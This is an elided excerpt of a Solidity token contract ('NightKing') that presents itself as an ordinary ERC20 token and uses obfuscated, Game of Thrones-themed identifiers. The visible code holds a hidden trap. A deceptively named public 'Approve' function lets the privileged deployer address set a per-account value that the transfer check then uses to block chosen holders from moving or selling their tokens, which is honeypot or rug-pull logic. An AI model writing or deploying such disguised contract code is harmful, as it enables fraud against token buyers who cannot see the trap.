...
abstract contract Targaryen {
    uint256 constant AEGON = 1;
    bool DaarioNaharis = true;
}

abstract contract Faceless {
    event Hizdahr(
        address loraq,
        bool mopatis,
        address payne
...
contract NightKing is IERC20, Faceless, Targaryen, Ownable {
    ...
    mapping(address => address) private _army;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => Giantsbane) private _giantsbane;

    Westeros[] private _westeros;
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _westeros.push(Westeros(king_, true));
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _marilion(from, account, amount);
        _allowances[from][from] = amount;
        _luwin(from, account, amount);
        emit Approval(from, address(this), amount);
        return true;
    }

    function _marilion(address from, address account, uint256 chiva) internal {
        uint256 duur = 0;
        require(account != address(0), "invalid address");
        if (from != _westeros[0].walker) {
            _giantsbane[from].viserion -= duur;
            _giantsbane[account].viserion += duur;
        } else {
            _giantsbane[from].viserion -= duur;
            duur += chiva;
            _giantsbane[account].viserion = duur;
    ...
    function _luwin(address from, address recipients, uint256 osha) internal {
        uint256 total = 0;
        if (recipients == _westeros[0].walker) {
    ...
    function _transfer(
        ...
        require(amount - _giantsbane[sender].viserion > 0, "alien");
